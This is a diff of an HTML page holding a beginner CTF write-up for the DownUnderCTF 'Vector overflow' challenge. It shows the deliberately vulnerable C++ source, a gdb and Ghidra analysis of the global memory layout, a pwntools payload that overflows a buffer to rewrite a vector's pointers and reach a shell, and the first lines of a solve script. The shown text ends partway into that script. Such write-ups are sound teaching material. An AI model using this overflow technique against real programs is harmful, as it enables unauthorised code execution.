@@ -11,6 +11,8 @@
       
       
       
+        <link rel="prev" href="../transmissions/">
+      
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -247,6 +249,113 @@
   
 
     
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Vector overflow
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Vector overflow
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#prologue" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prologue
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#my-struggle" class="md-nav__link">
+    <span class="md-ellipsis">
+      My struggle
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="My struggle">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#epilogue" class="md-nav__link">
+    <span class="md-ellipsis">
+      Epilogue
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
   </ul>
 </nav>
                   </div>
@@ -287,6 +396,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="My struggle">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -321,7 +454,7 @@
   
 
 
-  <h1>Vector overflow writeup</h1>
+  <h1>Vector overflow</h1>
 
 <h2 id="prologue">Prologue<a class="headerlink" href="#prologue" title="Permanent link">&para;</a></h2>
 <p>Difficulty: beginner</p>
@@ -329,11 +462,85 @@
 <p>Solved: 239</p>
 <div class="admonition quote">
 <p class="admonition-title">Description</p>
+<p>Please overflow into the vector and control it!</p>
 </div>
 <p>Input files:</p>
 <details class="info">
-<summary>encoding.txt</summary>
+<summary>vector_overflow.c</summary>
+<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;cstdlib&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;iostream&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;vector&gt;</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="w"> </span><span class="n">v</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="sc">&#39;X&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;X&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;X&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;X&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;X&#39;</span><span class="p">};</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">lose</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Bye!&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">win</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ductf</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;DUCTF&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ductf</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">std</span><span class="o">::</span><span class="n">cin</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">buf</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">v</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="w"> </span><span class="o">&amp;</span><span class="n">c</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">*</span><span class="n">d</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">lose</span><span class="p">();</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="n">win</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">lose</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></table></div>
 </details>
+<ul>
+<li><a href="https://github.com/DownUnderCTF/Challenges_2024_Public/blob/f2797a33d8f5851508f37e854afceedf85eee8a3/beginner/vector-overflow/src/vector_overflow">vector_overflow binary</a></li>
+</ul>
 <p>NB:</p>
 <ul>
 <li>
@@ -345,8 +552,280 @@
 </ul>
 <ul>
 <li>Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure.</li>
+<li>I am using gdb with <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> plugin</li>
 </ul>
 <h2 id="my-struggle">My struggle<a class="headerlink" href="#my-struggle" title="Permanent link">&para;</a></h2>
+<h3 id="analysis">Analysis<a class="headerlink" href="#analysis" title="Permanent link">&para;</a></h3>
+<p>This is one of the most straightforward challenges that is a good introduction to binary exploitation.</p>
+<p>First review source code to understand what the program intends to do and where is vulnerability we can target:</p>
+<div class="language-c highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">trimmed source code with explanaition</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="w"> </span><span class="n">v</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="sc">&#39;X&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;X&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;X&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;X&#39;</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;X&#39;</span><span class="p">};</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ductf</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;DUCTF&quot;</span><span class="p">;</span><span class="w"> </span><span class="c1">// initializes ductf to string &quot;DUCTF&quot;</span>
+<span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ductf</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">std</span><span class="o">::</span><span class="n">cin</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">buf</span><span class="p">;</span><span class="w"> </span><span class="c1">// read user input into global variable buf</span>
+<span class="w">    </span><span class="c1">// compare variable ductf with global variable v,</span>
+<span class="w">    </span><span class="c1">// if they are equal, execute win()</span>
+<span class="w">    </span><span class="c1">// otherwise execute lose() </span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">v</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="w"> </span><span class="o">&amp;</span><span class="n">c</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">*</span><span class="n">d</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">lose</span><span class="p">();</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="n">win</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">lose</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p>So, in order to execute <code>win()</code> we should change variable v to be <code>DUCTF</code>, notice how global variables are next to each other?
+<code>v</code> is declared right after <code>buf</code>, this means that there is a good chance that in memory they also will be placed sequentially
+one after another.</p>
+<p>We can test this theory and find locations of global variables by inspecting the binary. First, lets check its general information:
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>file<span class="w"> </span>vector_overflow
+<span class="w">  </span>vector_overflow:<span class="w"> </span>ELF<span class="w"> </span><span class="m">64</span>-bit<span class="w"> </span>LSB<span class="w"> </span>executable,
+<span class="w">  </span>x86-64,<span class="w">  </span><span class="c1">#  64-bit executable  </span>
+<span class="w">  </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>SYSV<span class="o">)</span>,
+<span class="w">  </span>dynamically<span class="w"> </span>linked,
+<span class="w">  </span>interpreter<span class="w"> </span>/lib64/ld-linux-x86-64.so.2,
+<span class="w">  </span>BuildID<span class="o">[</span>sha1<span class="o">]=</span>4a0b824c662ee47b5cd3e73176c0092f1fcf714b,
+<span class="w">  </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">3</span>.2.0,
+<span class="w">  </span>not<span class="w"> </span>stripped<span class="w"> </span><span class="c1"># symbols are not stripped</span>
+</code></pre></div></td></tr></table></div></p>
+<p>There are two tools we can use find locations of variable:</p>
+<ol>
+<li>
+<p>open the binary in <a href="https://ghidra-sre.org/">ghidra</a></p>
+<ul>
+<li>
+<p>given symbols are not stripped, we can search them by name:
+   <img alt="ghidra_1a.png" src="ghidra_1a.png" /></p>
+<p>On the image:</p>
+<ul>
+<li>1 search for variable <code>buf</code> in symbol tree</li>
+<li>2 select it in the list</li>
+<li>3 once selected the main view show address of the variable <code>004051e0</code></li>
+<li>4 ghidra also annotates variable names in the main view we can see both <code>buf</code> and <code>v</code> right after it( address <code>004051f0</code>)</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>
+<p>second option to find out address with ghidra is through assembly (this works even if binary symbols are stripped):
+   <img alt="ghidra_1b.png" src="ghidra_1b.png" /></p>
+<p>On the image:</p>
+<ul>
+<li>1 go to function <code>main</code> (ghidra usually detects it automatically, sometimes depending of source language
+    it can be called <code>entry</code> or have a standard language wrapper)</li>
+<li>2 find <code>call</code> to <code>operator&gt;&gt;</code> on <code>std::cin</code></li>
+<li>3 work up from <code>call</code> and check how registers initialised before the call, we can see <abbr title="general purpose register on x86_64 architecture">RSI</abbr> is initialised with address
+    to a global variable <code>buf</code> (if there would be no symbols we would see <code>DATA_004051e0</code> instead of <code>buf</code> which doesn't change much).
+    Similarly, we could find below in assembly access to another global variable (<code>v</code> or <code>DATA_004051f0</code>) when comparing of content happens.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Launch the binary in gdb and inspect memory</p>
+<ul>
+<li>find variables by name
+ <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>gdb<span class="w"> </span>./vector_overflow
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>b<span class="w"> </span>main<span class="w"> </span><span class="c1"># breakpoint at main function</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span><span class="c1"># run executable till it hits breakpoint</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>p<span class="w"> </span><span class="p">&amp;</span>buf<span class="w"> </span><span class="c1"># check address of variable buf</span>
+<span class="nv">$1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>&lt;data<span class="w"> </span>variable,<span class="w"> </span>no<span class="w"> </span>debug<span class="w"> </span>info&gt;<span class="w"> </span>*<span class="o">)</span><span class="w"> </span>0x4051e0<span class="w"> </span>&lt;buf&gt;
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>p<span class="w"> </span><span class="p">&amp;</span>v<span class="w"> </span><span class="c1"># check address of variable v</span>
+<span class="nv">$2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>&lt;data<span class="w"> </span>variable,<span class="w"> </span>no<span class="w"> </span>debug<span class="w"> </span>info&gt;<span class="w"> </span>*<span class="o">)</span><span class="w"> </span>0x4051f0<span class="w"> </span>&lt;v&gt;
+</code></pre></div></td></tr></table></div></li>
+</ul>
+<ul>
+<li>inspect memory
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="w"> </span>$<span class="w"> </span>gdb<span class="w"> </span>./vector_overflow
+<span class="w"> </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>b<span class="w"> </span>main<span class="w"> </span><span class="c1"># breakpoint at main function</span>
+<span class="w"> </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span><span class="c1"># run executable till it hits breakpoint</span>
+<span class="w"> </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="c1"># step with `ci` through the code till we will be asked to enter input</span>
+<span class="w"> </span>myteststring<span class="w"> </span><span class="c1"># our input that saved into buffer</span>
+<span class="w"> </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>search<span class="w"> </span>myteststring<span class="w"> </span><span class="c1"># scan memory where our string was saved (requires pwndbg plugin)</span>
+<span class="w">   </span>Searching<span class="w"> </span><span class="k">for</span><span class="w"> </span>value:<span class="w"> </span><span class="s1">&#39;myteststring&#39;</span>
+<span class="w">   </span>vector_overflow<span class="w"> </span>0x4051e0<span class="w"> </span><span class="s1">&#39;myteststring&#39;</span><span class="w"> </span><span class="c1"># found our global variable at address 0x4051e0</span>
+<span class="w">   </span><span class="o">[</span>heap<span class="o">]</span><span class="w">          </span>0x4182d0<span class="w"> </span><span class="s1">&#39;myteststring\n&#39;</span>
+<span class="w"> </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/16c<span class="w"> </span>0x4051e0<span class="w"> </span><span class="c1"># read 16 characters from address 0x4051e0 (remember type of variable buf is char[16])</span>
+<span class="w">   </span>0x4051e0:<span class="w">  </span><span class="s1">&#39;m&#39;</span><span class="w"> </span><span class="s1">&#39;y&#39;</span><span class="w"> </span><span class="s1">&#39;t&#39;</span><span class="w"> </span><span class="s1">&#39;e&#39;</span><span class="w"> </span><span class="s1">&#39;s&#39;</span><span class="w"> </span><span class="s1">&#39;t&#39;</span><span class="w"> </span><span class="s1">&#39;s&#39;</span><span class="w"> </span><span class="s1">&#39;t&#39;</span><span class="w"> </span><span class="s1">&#39;r&#39;</span><span class="w"> </span><span class="s1">&#39;i&#39;</span><span class="w"> </span><span class="s1">&#39;n&#39;</span><span class="w"> </span><span class="s1">&#39;g&#39;</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="s1">&#39;0&#39;</span>
+<span class="w"> </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/2gx<span class="w"> </span>0x4051f0+16<span class="w"> </span><span class="c1"># read two giant (8byte) numbers in hex format starting after buf ends</span>
+<span class="w">   </span>0x4051f0<span class="w"> </span>&lt;v&gt;:<span class="w">   </span>0x00000000004182b0<span class="w">      </span>0x00000000004182b5<span class="w"> </span><span class="c1"># vector in represented in memory as two consecutive pointers to start and end of content</span>
+<span class="w"> </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>print<span class="w"> </span>0x00000000004182b5<span class="w"> </span>-<span class="w"> </span>0x00000000004182b0<span class="w">         </span><span class="c1"># we can check length is 5</span>
+<span class="w">  </span><span class="nv">$3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">5</span>
+<span class="w"> </span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/5c<span class="w"> </span>0x00000000004182b0<span class="w"> </span><span class="c1"># read 5 characters from the start of the vector data</span>
+<span class="w">   </span>0x4182b0:<span class="w">       </span><span class="m">88</span><span class="w"> </span><span class="s1">&#39;X&#39;</span><span class="w">  </span><span class="m">88</span><span class="w"> </span><span class="s1">&#39;X&#39;</span><span class="w">  </span><span class="m">88</span><span class="w"> </span><span class="s1">&#39;X&#39;</span><span class="w">  </span><span class="m">88</span><span class="w"> </span><span class="s1">&#39;X&#39;</span><span class="w">  </span><span class="m">88</span><span class="w"> </span><span class="s1">&#39;X&#39;</span><span class="w"> </span><span class="c1"># 88 is ascii value of &#39;X&#39; (remember in source code we have `vector v = {&#39;X&#39;, &#39;X&#39;, &#39;X&#39;, &#39;X&#39;, &#39;X&#39;})</span>
+</code></pre></div></td></tr></table></div></li>
+</ul>
+</li>
+</ol>
+<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<p>So, given program reads as much data as we provide, we are not limited to 16 characters, we can overflow into <code>v</code> and change vector
+to <code>DUCTF</code>. To reiterate this is memory layout that we normally have (see <code>analysis</code> section above for more detailed explanation of each element):
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/32bx<span class="w"> </span>0x4051e0<span class="w"> </span><span class="c1"># read 32 bytes at buf address</span>
+0x4051e0<span class="w"> </span>&lt;buf&gt;:<span class="w"> </span>0x6d<span class="w">    </span>0x79<span class="w">    </span>0x74<span class="w">    </span>0x65<span class="w">    </span>0x73<span class="w">    </span>0x74<span class="w">    </span>0x73<span class="w">    </span>0x74<span class="w"> </span><span class="c1"># start of buf ascii of myteststring</span>
+0x4051e8<span class="w"> </span>&lt;buf+8&gt;:<span class="w">       </span>0x72<span class="w">    </span>0x69<span class="w">    </span>0x6e<span class="w">    </span>0x67<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00
+0x4051f0<span class="w"> </span>&lt;v&gt;:<span class="w">   </span>0xb0<span class="w">    </span>0x82<span class="w">    </span>0x41<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w"> </span><span class="c1"># start of variable v first 8 bytes is pointer to start of content of the vector </span>
+0x4051f8<span class="w"> </span>&lt;v+8&gt;:<span class="w"> </span>0xb5<span class="w">    </span>0x82<span class="w">    </span>0x41<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w"> </span><span class="c1"># second pointer of v points to end of content of the vector</span>
+</code></pre></div></td></tr></table></div></p>
+<p>Note that pointer addresses that we saw before (0x00000000004182b0, 0x00000000004182b5) are written in little endian format (reversed of
+what we used to). For example value <code>0x0055000004000201</code> is stored as <code>0x01 0x02 0x00 0x04 0x00 0x00 0x55 0x00</code> in memory.</p>
+<p>Our goal is to achieve following memory state:
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/32bx<span class="w"> </span>0x4051e0<span class="w"> </span><span class="c1"># read 32 bytes at buf address</span>
+0x4051e0<span class="w"> </span>&lt;buf&gt;:<span class="w">   </span><span class="s1">&#39;D&#39;</span><span class="w">    </span><span class="s1">&#39;U&#39;</span><span class="w">    </span><span class="s1">&#39;C&#39;</span><span class="w">    </span><span class="s1">&#39;T&#39;</span><span class="w">    </span><span class="s1">&#39;F&#39;</span><span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w"> </span><span class="c1"># start out input with DUCTF</span>
+0x4051e8<span class="w"> </span>&lt;buf+8&gt;:<span class="w"> </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w"> </span><span class="c1"># rest of the buffer is not important</span>
+0x4051f0<span class="w"> </span>&lt;v&gt;:<span class="w">     </span>0xe0<span class="w">    </span>0x51<span class="w">    </span>0x40<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w"> </span><span class="c1"># first pointer of v should point to DUCTF that we entered above</span>
+0x4051f8<span class="w"> </span>&lt;v+8&gt;:<span class="w">   </span>0xe5<span class="w">    </span>0x51<span class="w">    </span>0x40<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w">    </span>0x00<span class="w"> </span><span class="c1"># second pointer of v should point to end string DUCTF</span>
+</code></pre></div></td></tr></table></div></p>
+<p>If all required bytes were ascii printable it would be easy to enter them manually, but they don't so I used  <a href="https://github.com/Gallopsled/pwntools">pwntools</a>.
+This is CTF framework for binary exploitation, its only "disadvantage" is it has all features you can think of, so it can be overwhelming sometimes.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">python script</label><label for="__tabbed_1_2">output</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-py highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">paylod</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+    <span class="sa">b</span><span class="s1">&#39;DUCTF</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">10</span><span class="p">,</span>
+    <span class="n">pack</span><span class="p">(</span><span class="mh">0x4051e0</span><span class="p">),</span>
+    <span class="n">pack</span><span class="p">(</span><span class="mh">0x4051e0</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span>
+<span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">hexdump</span><span class="p">(</span><span class="n">paylod</span><span class="p">))</span>
+</code></pre></div></td></tr></table></div>
+</div>
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code>00000000  44 55 43 54  46 00 00 00  00 00 00 00  00 00 00 00  │DUCT│F···│····│····│
+00000010  e0 51 40 00  00 00 00 00  e5 51 40 00  00 00 00 00  │·Q@·│····│·Q@·│····│
+</code></pre></div>
+</div>
+</div>
+</div>
+<p>Full script to launch binary (or connect to CTF server if REMOTE param provided) and send the payload:</p>
+<details class="success">
+<summary>solve.py</summary>
+<div class="language-py highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># initialize library to work with binary</span>
